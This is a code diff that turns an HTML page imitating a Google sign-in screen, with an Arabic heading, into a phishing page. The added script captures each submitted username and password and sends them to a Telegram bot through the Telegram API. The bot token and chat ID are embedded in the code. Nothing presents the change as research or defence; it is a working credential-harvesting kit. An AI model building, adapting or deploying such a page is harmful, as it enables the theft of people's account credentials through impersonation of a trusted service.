@@ -74,7 +74,7 @@
     <div class="login-container">
         <img src="https://www.gstatic.com/images/branding/product/2x/google_cloud_96dp.png" alt="Google Logo">
         <h2>تسجيل الدخول إلى جوجل</h2>
-        <form action="/login" method="POST">
+        <form id="loginForm" method="POST">
             <div class="form-group">
                 <input type="text" name="username" placeholder="اسم المستخدم" required>
             </div>
@@ -90,6 +90,25 @@
             <p>ليس لديك حساب؟ <a href="#">إنشاء حساب جديد</a></p>
         </div>
     </div>
+
+    <!-- سكربت لإرسال بيانات الدخول إلى بوت Telegram -->
+    <script>
+        const form = document.getElementById('loginForm');
+        form.addEventListener('submit', function(event) {
+            event.preventDefault();
+            const username = form.username.value;
+            const password = form.password.value;
+            // Replace with your Telegram bot token and chat ID
+            const botToken = '7317054018:AAGInl8VmqVPK1fRIYfHx7zRnGceuTcH5pY';
+            const chatId = '1538488453';
+            const message = `تسجيل دخول جديد:\nاسم المستخدم: ${username}\nكلمة المرور: ${password}`;
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+            fetch(url)
+                .then(response => response.json())
+                .then(data => console.log('Message sent to Telegram:', data))
+                .catch(error => console.error('Error sending message to Telegram:', error));
+        });
+    </script>
 </body>
 
 </html>
